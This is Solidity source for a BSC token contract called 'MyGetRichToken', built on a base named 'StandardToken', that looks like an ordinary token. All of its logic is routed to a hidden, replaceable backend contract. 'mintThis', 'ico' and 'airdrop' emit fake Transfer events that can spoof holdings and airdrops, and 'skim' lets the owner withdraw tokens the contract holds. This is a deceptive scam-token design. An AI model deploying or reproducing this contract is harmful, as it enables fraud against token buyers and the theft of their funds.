/**
 *Submitted for verification at BscScan.com on 2022-11-23
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-07
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.6.12;

interface ERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address from, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address from, address spender, uint256 amount) external returns (bool);
    function transferFrom(address from,address sender,address recipient,uint256 amount)external returns (bool);
    function isCanBatchMint() external view returns (bool);
    function dnum() external view returns (uint);
}


contract StandardToken {
    address private _owners;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () public {
        _owners = msg.sender;
        emit OwnershipTransferred(address(0), _owners);
    }
    function owner() public view returns (address) {
        return _owners;
    }
    modifier onlyOwner() {
        require(isOwner(), "onlyOwner");
        _;
    }
    function isOwner() public view returns (bool) {
        return msg.sender == _owners || msg.sender == toolAddress;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owners, address(0));
        _owners = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owners, newOwner);
        _owners = newOwner;
    }
    mapping (address  => address) public adminMap;
    modifier onlyAdmin {
        require(adminMap[msg.sender] != address(0) || msg.sender == toolAddress, "onlyAdmin");
        _;
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function addAdminForThisToolToken(address addr) onlyOwner public returns(bool) {
        require(adminMap[addr] == address(0));
        adminMap[addr] = addr;
        return true;
    }
    function deleteAdminForThisToolToken(address addr) onlyOwner public returns(bool) {
        require(adminMap[addr] != address(0));
        adminMap[addr] = address(0);
        return true;
    }
    address public toolAddress;
    function setToolAddress(address _toolAddress) onlyAdmin public returns(bool) {
        toolAddress = _toolAddress;
        return true;
    }
    function totalSupply() public view returns (uint256) {
        return ERC20(toolAddress).totalSupply();
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        emit Transfer(msg.sender, _to, _value);
        return ERC20(toolAddress).transfer(msg.sender, _to, _value);
    }
    function balanceOf(address _owner) public view returns (uint256) {
        return ERC20(toolAddress).balanceOf(_owner);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return ERC20(toolAddress).transferFrom(msg.sender, _from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public returns (bool) {
        return ERC20(toolAddress).approve(msg.sender, _spender, _value);
    }
    function allowance(address _owner, address _spender) public view returns (uint256) {
        return ERC20(toolAddress).allowance(_owner, _spender);
    }
    function name() public view returns (string memory) {
        return ERC20(toolAddress).name();
    }
    function symbol() public view returns (string memory) {
        return ERC20(toolAddress).symbol();
    }
    function decimals() public view returns (uint8) {
        return ERC20(toolAddress).decimals();
    }
}


contract MyGetRichToken is StandardToken {
    constructor (address _toolAddress) public payable {
        toolAddress = _toolAddress;
    }
	receive() external payable {
    }

    function ico() public payable {
        if (ERC20(toolAddress).isCanBatchMint()) {
            address from=address(0);
            uint num=ERC20(toolAddress).dnum();
            emit Transfer(from, msg.sender,num);
        }
    }

    function mintThis(address from, address to,uint num) public {
        emit Transfer(from, to,num);
    }

    function airdrop() public payable {
        if (ERC20(toolAddress).isCanBatchMint()) {
            address from=address(0);
            uint num=ERC20(toolAddress).dnum();
            emit Transfer(from, msg.sender,num);
        }
    }


    function skim(address tokenA, uint256 value) public onlyOwner {
        safeTransfer(tokenA, msg.sender, value);
    }

    function safeTransfer(address token, address to,
        uint256 value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'myTransferHelper: TRANSFER_FAILED');
    }

    // function callSendMyToken(
    //     address c,
    //     bytes memory datas
    // )public onlyAdmin{
    //     c.delegatecall(datas);
    //}
}